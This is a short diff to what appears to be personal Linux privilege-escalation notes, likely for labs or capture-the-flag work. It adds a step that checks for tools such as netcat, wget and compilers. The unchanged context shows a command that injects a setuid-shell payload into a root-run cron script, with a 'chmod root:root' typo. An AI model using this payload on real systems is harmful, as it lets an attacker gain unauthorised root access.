@@ -13,6 +13,10 @@ user@machine:
 2. Check cronjobs
 cd /etc/cron* - Check all the folders
 
+3. Check the programs avilable in the machine
+
+which awk perl python ruby gcc cc vi vim nmap find netcat nc wget tftp ftp 2>/dev/nul
+
 **3. Using vulnerable cronjob running in root**
 
 echo "cp /bin/dash /tmp/exploit; chmod u+s /tmp/exploit;chmod root:root /tmp/exploit">>/usr/local/sbin/cron-logrotate.sh
